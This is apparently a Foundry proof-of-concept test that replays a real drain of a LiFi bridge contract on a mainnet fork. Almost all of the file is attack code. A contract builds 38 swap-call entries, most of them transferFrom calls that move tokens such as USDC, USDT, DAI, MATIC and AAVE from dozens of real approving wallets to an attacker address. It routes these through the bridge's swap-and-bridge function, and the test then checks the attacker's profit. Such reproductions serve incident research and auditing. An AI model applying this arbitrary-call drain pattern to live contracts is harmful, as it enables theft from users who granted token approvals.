
pragma solidity ^0.8.20;

import {IERC20Like, Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 14420686;
    uint256 constant TX_TIMESTAMP = 1647744704;
    uint256 constant TX_BLOCK_NUMBER = 14420687;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        LiFiBridgeDrain attack = _bindAttack();
        _prepareProfit(attack);
        attack.attack{value: TX_VALUE}();
        vm.stopPrank();
        _assertProfit();
        _assertEcon();
    }

    function _bindAttack() internal returns (LiFiBridgeDrain attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchRuntime();
            attack = LiFiBridgeDrain(payable(ATTACK_CONTRACT));
        } else {
            attack = new LiFiBridgeDrain();
        }
    }

    function _prepareProfit(LiFiBridgeDrain attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _etchRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(LiFiBridgeDrain).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        economicOracles.push(
            EconomicOracle({
                holder: Addresses.UNI_V2,
                asset: Addresses.USDC,
                symbol: "USDC",
                oracleKind: "position_delta",
                expectPositive: false,
                expectedDeltaRaw: 49863998,
                balancerInternalBalance: false
            })
        );
        economicOracles.push(
            EconomicOracle({
                holder: Addresses.UNI_V2,
                asset: Addresses.USDT,
                symbol: "USDT",
                oracleKind: "position_delta",
                expectPositive: true,
                expectedDeltaRaw: 50000000,
                balancerInternalBalance: false
            })
        );
    }
}

contract LiFiBridgeDrain {
    function attack() external payable {
        _drainViaLiFi();
    }

    function _drainViaLiFi() internal {
        LiFiSwapData[] memory swapCalls = new LiFiSwapData[](38);
        swapCalls[0] = LiFiSwapData({
            callTo: Addresses.ZeroEx,
            approveTo: Addresses.ZeroEx,
            sendingAsset: Addresses.USDT,
            receivingAsset: Addresses.USDC,
            fromAmount: 50000000,
            callData: abi.encodeWithSelector(
                IZeroExLike.sellToUniswap.selector,
                _addressArray2(Addresses.USDT, Addresses.USDC),
                uint256(50000000),
                uint256(40000000),
                false
            )
        });
        swapCalls[1] = LiFiSwapData({
            callTo: Addresses.MATIC,
            approveTo: Addresses.ZERO,
            sendingAsset: Addresses.ZERO,
            receivingAsset: Addresses.ZERO,
            fromAmount: 0,
            callData: abi.encodeWithSelector(
                IERC20Like.transferFrom.selector,
                Addresses.A_445C21_FA17,
                Addresses.A_878099_177E,
                uint256(3037410587818508608814)
            )
        });
        swapCalls[2] = LiFiSwapData({
            callTo: Addresses.MATIC,
            approveTo: Addresses.ZERO,
            sendingAsset: Addresses.ZERO,
            receivingAsset: Addresses.ZERO,
            fromAmount: 0,
            callData: abi.encodeWithSelector(
                IERC20Like.transferFrom.selector,
                Addresses.A_9B36F2_C1CF,
                Addresses.A_878099_177E,
                uint256(107476780372256517339)
            )
        });
        swapCalls[3] = LiFiSwapData({
            callTo: Addresses.RPL,
            approveTo: Addresses.ZERO,
            sendingAsset: Addresses.ZERO,
            receivingAsset: Addresses.ZERO,
            fromAmount: 0,
            callData: abi.encodeWithSelector(
                IERC20Like.transferFrom.selector,
                Addresses.A_5A7517_8DD4,
                Addresses.A_878099_177E,
                uint256(44860874300000000000)
            )
        });
        swapCalls[4] = LiFiSwapData({
            callTo: Addresses.GNO,
            approveTo: Addresses.ZERO,
            sendingAsset: Addresses.ZERO,
            receivingAsset: Addresses.ZERO,
            fromAmount: 0,
            callData: abi.encodeWithSelector(
                IERC20Like.transferFrom.selector,
                Addresses.A_9241F2_3E64,
                Addresses.A_878099_177E,
                uint256(944405031229340416)
            )
        });
        swapCalls[5] = LiFiSwapData({
            callTo: Addresses.USDT,
            approveTo: Addresses.ZERO,
            sendingAsset: Addresses.ZERO,
            receivingAsset: Addresses.ZERO,
            fromAmount: 0,
            callData: abi.encodeWithSelector(
                IERC20Like.transferFrom.selector,
                Addresses.A_8DE133_D7D1,
                Addresses.A_878099_177E,
                uint256(181399799730)
            )
        });
        swapCalls[6] = LiFiSwapData({
            callTo: Addresses.USDT,
            approveTo: Addresses.ZERO,
            sendingAsset: Addresses.ZERO,
            receivingAsset: Addresses.ZERO,
            fromAmount: 0,
            callData: abi.encodeWithSelector(
                IERC20Like.transferFrom.selector,
                Addresses.A_9241F2_3E64,
                Addresses.A_878099_177E,
                uint256(120625535311)
            )
        });
        swapCalls[7] = LiFiSwapData({
            callTo: Addresses.USDT,
            approveTo: Addresses.ZERO,
            sendingAsset: Addresses.ZERO,
            receivingAsset: Addresses.ZERO,
            fromAmount: 0,
            callData: abi.encodeWithSelector(
                IERC20Like.transferFrom.selector,
                Addresses.A_D92B2A_E395,
                Addresses.A_878099_177E,
                uint256(10000000000)
            )
        });
        swapCalls[8] = LiFiSwapData({
            callTo: Addresses.USDT,
            approveTo: Addresses.ZERO,
            sendingAsset: Addresses.ZERO,
            receivingAsset: Addresses.ZERO,
            fromAmount: 0,
            callData: abi.encodeWithSelector(
                IERC20Like.transferFrom.selector,
                Addresses.A_FFD2A8_D766,
                Addresses.A_878099_177E,
                uint256(4476636084)
            )
        });
        swapCalls[9] = LiFiSwapData({
            callTo: Addresses.USDT,
            approveTo: Addresses.ZERO,
            sendingAsset: Addresses.ZERO,
            receivingAsset: Addresses.ZERO,
            fromAmount: 0,
            callData: abi.encodeWithSelector(
                IERC20Like.transferFrom.selector,
                Addresses.A_7C89A5_CD96,
                Addresses.A_878099_177E,
                uint256(51859434887)
            )
        });
        swapCalls[10] = LiFiSwapData({
            callTo: Addresses.USDT,
            approveTo: Addresses.ZERO,
            sendingAsset: Addresses.ZERO,
            receivingAsset: Addresses.ZERO,
            fromAmount: 0,
            callData: abi.encodeWithSelector(
                IERC20Like.transferFrom.selector,
                Addresses.A_5B9E4D_149A,
                Addresses.A_878099_177E,
                uint256(383883630)
            )
        });
        swapCalls[11] = LiFiSwapData({
            callTo: Addresses.USDT,
            approveTo: Addresses.ZERO,
            sendingAsset: Addresses.ZERO,
            receivingAsset: Addresses.ZERO,
            fromAmount: 0,
            callData: abi.encodeWithSelector(
                IERC20Like.transferFrom.selector, Addresses.A_684ABE_DC6E, Addresses.A_878099_177E, uint256(0)
            )
        });
        swapCalls[12] = LiFiSwapData({
            callTo: Addresses.MVI,
            approveTo: Addresses.ZERO,
            sendingAsset: Addresses.ZERO,
            receivingAsset: Addresses.ZERO,
            fromAmount: 0,
            callData: abi.encodeWithSelector(
                IERC20Like.transferFrom.selector,
                Addresses.A_156972_1A35,
                Addresses.A_878099_177E,
                uint256(22950860845096132852)
            )
        });
        swapCalls[13] = LiFiSwapData({
            callTo: Addresses.USDC,
            approveTo: Addresses.ZERO,
            sendingAsset: Addresses.ZERO,
            receivingAsset: Addresses.ZERO,
            fromAmount: 0,
            callData: abi.encodeWithSelector(
                IERC20Like.transferFrom.selector,
                Addresses.A_DFFD8B_B6C0,
                Addresses.A_878099_177E,
                uint256(1000000000)
            )
        });
        swapCalls[14] = LiFiSwapData({
            callTo: Addresses.USDC,
            approveTo: Addresses.ZERO,
            sendingAsset: Addresses.ZERO,
            receivingAsset: Addresses.ZERO,
            fromAmount: 0,
            callData: abi.encodeWithSelector(
                IERC20Like.transferFrom.selector,
                Addresses.A_2182E4_7931,
                Addresses.A_878099_177E,
                uint256(591497564)
            )
        });
        swapCalls[15] = LiFiSwapData({
            callTo: Addresses.USDC,
            approveTo: Addresses.ZERO,
            sendingAsset: Addresses.ZERO,
            receivingAsset: Addresses.ZERO,
            fromAmount: 0,
            callData: abi.encodeWithSelector(
                IERC20Like.transferFrom.selector,
                Addresses.A_195B8B_34A2,
                Addresses.A_878099_177E,
                uint256(1031798257)
            )
        });
        swapCalls[16] = LiFiSwapData({
            callTo: Addresses.USDC,
            approveTo: Addresses.ZERO,
            sendingAsset: Addresses.ZERO,
            receivingAsset: Addresses.ZERO,
            fromAmount: 0,
            callData: abi.encodeWithSelector(
                IERC20Like.transferFrom.selector,
                Addresses.A_5B7AB4_7963,
                Addresses.A_878099_177E,
                uint256(774404203)
            )
        });
        swapCalls[17] = LiFiSwapData({
            callTo: Addresses.USDC,
            approveTo: Addresses.ZERO,
            sendingAsset: Addresses.ZERO,
            receivingAsset: Addresses.ZERO,
            fromAmount: 0,
            callData: abi.encodeWithSelector(
                IERC20Like.transferFrom.selector,
                Addresses.A_80E7ED_8A83,
                Addresses.A_878099_177E,
                uint256(1000537946)
            )
        });
        swapCalls[18] = LiFiSwapData({
            callTo: Addresses.USDC,
            approveTo: Addresses.ZERO,
            sendingAsset: Addresses.ZERO,
            receivingAsset: Addresses.ZERO,
            fromAmount: 0,
            callData: abi.encodeWithSelector(
                IERC20Like.transferFrom.selector, Addresses.A_0586FC_3C25, Addresses.A_878099_177E, uint256(0)
            )
        });
        swapCalls[19] = LiFiSwapData({
            callTo: Addresses.USDC,
            approveTo: Addresses.ZERO,
            sendingAsset: Addresses.ZERO,
            receivingAsset: Addresses.ZERO,
            fromAmount: 0,
            callData: abi.encodeWithSelector(
                IERC20Like.transferFrom.selector,
                Addresses.A_CC77DF_6735,
                Addresses.A_878099_177E,
                uint256(5085751850)
            )
        });
        swapCalls[20] = LiFiSwapData({
            callTo: Addresses.USDC,
            approveTo: Addresses.ZERO,
            sendingAsset: Addresses.ZERO,
            receivingAsset: Addresses.ZERO,
            fromAmount: 0,
            callData: abi.encodeWithSelector(
                IERC20Like.transferFrom.selector,
                Addresses.A_45372C_6A75,
                Addresses.A_878099_177E,
                uint256(184659875)
            )
        });
        swapCalls[21] = LiFiSwapData({
            callTo: Addresses.USDC,
            approveTo: Addresses.ZERO,
            sendingAsset: Addresses.ZERO,
            receivingAsset: Addresses.ZERO,
            fromAmount: 0,
            callData: abi.encodeWithSelector(
                IERC20Like.transferFrom.selector,
                Addresses.A_14B2AF_DD97,
                Addresses.A_878099_177E,
                uint256(1548250000)
            )
        });
        swapCalls[22] = LiFiSwapData({
            callTo: Addresses.USDC,
            approveTo: Addresses.ZERO,
            sendingAsset: Addresses.ZERO,
            receivingAsset: Addresses.ZERO,
            fromAmount: 0,
            callData: abi.encodeWithSelector(
                IERC20Like.transferFrom.selector,
                Addresses.A_3942AE_B57A,
                Addresses.A_878099_177E,
                uint256(4879938172)
            )
        });
        swapCalls[23] = LiFiSwapData({
            callTo: Addresses.USDC,
            approveTo: Addresses.ZERO,
            sendingAsset: Addresses.ZERO,
            receivingAsset: Addresses.ZERO,
            fromAmount: 0,
            callData: abi.encodeWithSelector(
                IERC20Like.transferFrom.selector,
                Addresses.A_461E76_C31C,
                Addresses.A_878099_177E,
                uint256(15303033965)
            )
        });
        swapCalls[24] = LiFiSwapData({
            callTo: Addresses.USDC,
            approveTo: Addresses.ZERO,
            sendingAsset: Addresses.ZERO,
            receivingAsset: Addresses.ZERO,
            fromAmount: 0,
            callData: abi.encodeWithSelector(
                IERC20Like.transferFrom.selector,
                Addresses.A_00DACF_552C,
                Addresses.A_878099_177E,
                uint256(3018723508)
            )
        });
        swapCalls[25] = LiFiSwapData({
            callTo: Addresses.USDC,
            approveTo: Addresses.ZERO,
            sendingAsset: Addresses.ZERO,
            receivingAsset: Addresses.ZERO,
            fromAmount: 0,
            callData: abi.encodeWithSelector(
                IERC20Like.transferFrom.selector,
                Addresses.A_E5AEDD_5ADC,
                Addresses.A_878099_177E,
                uint256(788738904)
            )
        });
        swapCalls[26] = LiFiSwapData({
            callTo: Addresses.USDC,
            approveTo: Addresses.ZERO,
            sendingAsset: Addresses.ZERO,
            receivingAsset: Addresses.ZERO,
            fromAmount: 0,
            callData: abi.encodeWithSelector(
                IERC20Like.transferFrom.selector,
                Addresses.A_574A78_698E,
                Addresses.A_878099_177E,
                uint256(163171445612)
            )
        });
        swapCalls[27] = LiFiSwapData({
            callTo: Addresses.USDC,
            approveTo: Addresses.ZERO,
            sendingAsset: Addresses.ZERO,
            receivingAsset: Addresses.ZERO,
            fromAmount: 0,
            callData: abi.encodeWithSelector(
                IERC20Like.transferFrom.selector,
                Addresses.A_899CC1_975F,
                Addresses.A_878099_177E,
                uint256(627712497)
            )
        });
        swapCalls[28] = LiFiSwapData({
            callTo: Addresses.USDC,
            approveTo: Addresses.ZERO,
            sendingAsset: Addresses.ZERO,
            receivingAsset: Addresses.ZERO,
            fromAmount: 0,
            callData: abi.encodeWithSelector(
                IERC20Like.transferFrom.selector,
                Addresses.A_ACF65A_185F,
                Addresses.A_878099_177E,
                uint256(2380792227)
            )
        });
        swapCalls[29] = LiFiSwapData({
            callTo: Addresses.USDC,
            approveTo: Addresses.ZERO,
            sendingAsset: Addresses.ZERO,
            receivingAsset: Addresses.ZERO,
            fromAmount: 0,
            callData: abi.encodeWithSelector(
                IERC20Like.transferFrom.selector,
                Addresses.A_2E70C4_92DF,
                Addresses.A_878099_177E,
                uint256(625000000)
            )
        });
        swapCalls[30] = LiFiSwapData({
            callTo: Addresses.AUDIO,
            approveTo: Addresses.ZERO,
            sendingAsset: Addresses.ZERO,
            receivingAsset: Addresses.ZERO,
            fromAmount: 0,
            callData: abi.encodeWithSelector(
                IERC20Like.transferFrom.selector,
                Addresses.A_B0D497_FC8D,
                Addresses.A_878099_177E,
                uint256(1202371620631794480684)
            )
        });
        swapCalls[31] = LiFiSwapData({
            callTo: Addresses.AAVE,
            approveTo: Addresses.ZERO,
            sendingAsset: Addresses.ZERO,
            receivingAsset: Addresses.ZERO,
            fromAmount: 0,
            callData: abi.encodeWithSelector(
                IERC20Like.transferFrom.selector,
                Addresses.A_26AB15_71E2,
                Addresses.A_878099_177E,
                uint256(8989600608542871027)
            )
        });
        swapCalls[32] = LiFiSwapData({
            callTo: Addresses.JRT,
            approveTo: Addresses.ZERO,
            sendingAsset: Addresses.ZERO,
            receivingAsset: Addresses.ZERO,
            fromAmount: 0,
            callData: abi.encodeWithSelector(
                IERC20Like.transferFrom.selector,
                Addresses.A_DBA64F_E55B,
                Addresses.A_878099_177E,
                uint256(136805061760416718307579)
            )
        });
        swapCalls[33] = LiFiSwapData({
            callTo: Addresses.DAI,
            approveTo: Addresses.ZERO,
            sendingAsset: Addresses.ZERO,
            receivingAsset: Addresses.ZERO,
            fromAmount: 0,
            callData: abi.encodeWithSelector(
                IERC20Like.transferFrom.selector,
                Addresses.A_461E76_C31C,
                Addresses.A_878099_177E,
                uint256(592959324599911663609)
            )
        });
        swapCalls[34] = LiFiSwapData({
            callTo: Addresses.DAI,
            approveTo: Addresses.ZERO,
            sendingAsset: Addresses.ZERO,
            receivingAsset: Addresses.ZERO,
            fromAmount: 0,
            callData: abi.encodeWithSelector(
                IERC20Like.transferFrom.selector,
                Addresses.A_45F3FC_503C,
                Addresses.A_878099_177E,
                uint256(1358968773152900467441)
            )
        });
        swapCalls[35] = LiFiSwapData({
            callTo: Addresses.DAI,
            approveTo: Addresses.ZERO,
            sendingAsset: Addresses.ZERO,
            receivingAsset: Addresses.ZERO,
            fromAmount: 0,
            callData: abi.encodeWithSelector(
                IERC20Like.transferFrom.selector,
                Addresses.A_6E5C20_E53D,
                Addresses.A_878099_177E,
                uint256(5359458621755364862525)
            )
        });
        swapCalls[36] = LiFiSwapData({
            callTo: Addresses.DAI,
            approveTo: Addresses.ZERO,
            sendingAsset: Addresses.ZERO,
            receivingAsset: Addresses.ZERO,
            fromAmount: 0,
            callData: abi.encodeWithSelector(
                IERC20Like.transferFrom.selector,
                Addresses.A_0BC06C_984D,
                Addresses.A_878099_177E,
                uint256(1007655866311630018641)
            )
        });
        swapCalls[37] = LiFiSwapData({
            callTo: Addresses.DAI,
            approveTo: Addresses.ZERO,
            sendingAsset: Addresses.ZERO,
            receivingAsset: Addresses.ZERO,
            fromAmount: 0,
            callData: abi.encodeWithSelector(
                IERC20Like.transferFrom.selector,
                Addresses.A_0DF4FD_CC5F,
                Addresses.A_878099_177E,
                uint256(102448436826724168330)
            )
        });
        bytes memory bridgeCall = abi.encodeWithSignature(
            "swapAndStartBridgeTokensViaCBridge((bytes32,string,address,address,address,address,uint256,uint256),(address,address,address,address,uint256,bytes)[],(address,address,uint256,uint64,uint64,uint32))",
            LiFiBridgeData({
                transactionId: 0x1438ff9dd1cf9c70002c3b3cbec9c4c1b3f9eb02e29bcac90289ab3ba360e605,
                integrator: "li.finance",
                referrer: Addresses.ZERO,
                sendingAsset: Addresses.USDT,
                receivingAsset: Addresses.USDC,
                receiver: Addresses.A_878099_177E,
                destinationChainId: 42161,
                minAmount: 50000000
            }),
            swapCalls,
            CBridgeData({
                receiver: Addresses.A_878099_177E,
                token: Addresses.USDC,
                amount: 40000000,
                destinationChainId: 42161,
                nonce: 1647074829664,
                maxSlippage: 255921
            })
        );
        (bool ok,) = Addresses.A_73A499_FC8E.delegatecall(bridgeCall);
        require(ok, "LiFi delegatecall failed");
    }

    receive() external payable {}

    function swapAndStartBridgeTokensViaCBridge(
        LiFiBridgeData calldata bridgeData,
        LiFiSwapData[] calldata swapCalls,
        CBridgeData calldata cBridgeData
    ) external payable {
        bridgeData;
        swapCalls;
        cBridgeData;
        _drainViaLiFi();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    fallback() external payable {}

    function _addressArray2(address a0, address a1) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = a0;
        out[1] = a1;
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant A_00DACF_552C = 0x00DACfD769BC30e4F64805761707573cB710552c;
    address internal constant A_0586FC_3C25 = 0x0586fCc2D0d400596Ff326f30DEBAa3A79E33C25;
    address internal constant A_0BC06C_984D = 0x0bc06C67b5740b2Cc0a54d9281a7bCE5fd70984D;
    address internal constant A_0DF4FD_CC5F = 0x0dF4fDE307f216A7Da118Ad7eaEC500D42EECc5F;
    address internal constant A_14B2AF_DD97 = 0x14B2AF25e47f590a145aad5bE781687CA20eDd97;
    address internal constant A_156972_1A35 = 0x15697225D98885A4B007381cCf0006270D851A35;
    address internal constant AUDIO = 0x18aAA7115705e8be94bfFEBDE57Af9BFc265B998;
    address internal constant A_195B8B_34A2 = 0x195b8b9598904b55e9770492bD697529492034a2;
    address internal constant A_2182E4_7931 = 0x2182e4F2034bF5451F168d0643B2083150Ab7931;
    address internal constant A_22A9CC_7BBD = 0x22A9CCfdd10382D9cD18cA4437ff375bd7A87BBd;
    address internal constant A_26AB15_71E2 = 0x26ab154C70AEC017d78E6241da76949c37b171e2;
    address internal constant A_2E70C4_92DF = 0x2E70C44b708028A925A8021723AC92fb641292dF;
    address internal constant UNI_V2 = 0x3041CbD36888bECc7bbCBc0045E3B1f144466f5f;
    address internal constant A_3942AE_B57A = 0x3942Ae3782FbD658CC19A8Db602D937baF7CB57A;
    address internal constant A_445C21_FA17 = 0x445C21166a3Cb20b14FA84Cfc5D122F6bd3fFa17;
    address internal constant A_45372C_6A75 = 0x45372CCE828e185bfB008942CfE42a4C5cc76A75;
    address internal constant A_45F3FC_503C = 0x45f3fc38441B1aa7b60f8aAD8954582B17C9503c;
    address internal constant A_461E76_C31C = 0x461e76A4fE9f27605d4097A646837c32F1ccc31c;
    address internal constant A_5427FE_1820 = 0x5427FEFA711Eff984124bFBB1AB6fbf5E3DA1820;
    address internal constant A_574A78_698E = 0x574A782a00dd152D98fF85104F723575d870698e;
    address internal constant A_5A7517_8DD4 = 0x5a7517B2a3a390AaeC27d24B1621d0b9D7898dD4;
    address internal constant attack_contract = 0x5A9Fd7c39a6C488E715437D7b1f3C823d5596eD1;
    address internal constant A_5B7AB4_7963 = 0x5B7ab4B4B4768923cDdef657084223528C807963;
    address internal constant A_5B9E4D_149A = 0x5b9E4D0Dd21f4E071729A9eB522A2366AbeD149a;
    address internal constant GNO = 0x6810e776880C02933D47DB1b9fc05908e5386b96;
    address internal constant A_684ABE_DC6E = 0x684ABeBa554FDB4A5DAE32D652F198E25b64Dc6E;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant A_6E5C20_E53D = 0x6E5c200A784ba062ab770E6d317637F2fC82E53d;
    address internal constant MVI = 0x72e364F2ABdC788b7E918bc238B21f109Cd634D7;
    address internal constant A_73A499_FC8E = 0x73a499e043B03FC047189Ab1bA72EB595FF1fC8E;
    address internal constant A_7C89A5_CD96 = 0x7C89a5373312F9a02DD5c5834B4F2e3E6ce1Cd96;
    address internal constant MATIC = 0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0;
    address internal constant AAVE = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;
    address internal constant A_80E7ED_8A83 = 0x80e7Ed83354833aA7B87988F7e0426cFfE238A83;
    address internal constant A_878099_177E = 0x878099F08131a18Fab6bB0b4Cfc6B6DAe54b177E;
    address internal constant A_899CC1_975F = 0x899Cc16C88173dE60f3c830d004507F8Da3F975F;
    address internal constant JRT = 0x8A9C67fee641579dEbA04928c4BC45F66e26343A;
    address internal constant A_8DE133_D7D1 = 0x8de133a0859B847623c282b4dc5E18dE5dBFD7d1;
    address internal constant A_9241F2_3E64 = 0x9241f27DafFd0bb1Df4f2A022584Dd6C77843E64;
    address internal constant A_9B36F2_C1CF = 0x9b36f2bc04CD5B8a38715664263A3B3B856Bc1CF;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant FiatTokenV2_1 = 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF;
    address internal constant A_ACF65A_185F = 0xaCf65A171c67A7074Ee671240967696Ab5D1185F;
    address internal constant A_B0D497_FC8D = 0xB0d497A6CfF14E0A0079d5FeFf0C51c929F5Fc8D;
    address internal constant RPL = 0xB4EFd85c19999D84251304bDA99E90B92300Bd93;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant AAVE_ECE8 = 0xC13eac3B4F9EED480045113B7af00F7B5655Ece8;
    address internal constant attacker_eoa = 0xC6f2bDE06967E04caAf4bF4E43717c3342680d76;
    address internal constant JRT_933D = 0xC8Eb057f5e38F71FE42a9E59d51ac60926Ec933D;
    address internal constant A_CC77DF_6735 = 0xCC77Df7e9959C60e7eC427367E1Ae6E2720d6735;
    address internal constant A_D92B2A_E395 = 0xD92b2A99da006E72B48A14E4c23766E22B4ce395;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant A_DBA64F_E55B = 0xdba64f019c92649CF645D598322AE1aE2318e55b;
    address internal constant ZeroEx = 0xDef1C0ded9bec7F1a1670819833240f027b25EfF;
    address internal constant A_DFFD8B_B6C0 = 0xDFFD8BBf8dcAF236C4e009Ff6013Bfc98407B6C0;
    address internal constant A_E5AEDD_5ADC = 0xe5aedd6520c4D4e0cb4Ee78784a0187D34d55ADC;
    address internal constant A_FFD2A8_D766 = 0xFfd2a8f4275E76288D31DBb756Ce0e6065A3D766;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

struct LiFiBridgeData {
    bytes32 transactionId;
    string integrator;
    address referrer;
    address sendingAsset;
    address receivingAsset;
    address receiver;
    uint256 destinationChainId;
    uint256 minAmount;
}

struct LiFiSwapData {
    address callTo;
    address approveTo;
    address sendingAsset;
    address receivingAsset;
    uint256 fromAmount;
    bytes callData;
}

struct CBridgeData {
    address receiver;
    address token;
    uint256 amount;
    uint64 destinationChainId;
    uint64 nonce;
    uint32 maxSlippage;
}

interface IZeroExLike {
    function sellToUniswap(address[] calldata path, uint256 sellAmount, uint256 minBuyAmount, bool useSushi)
        external
        returns (uint256);
}
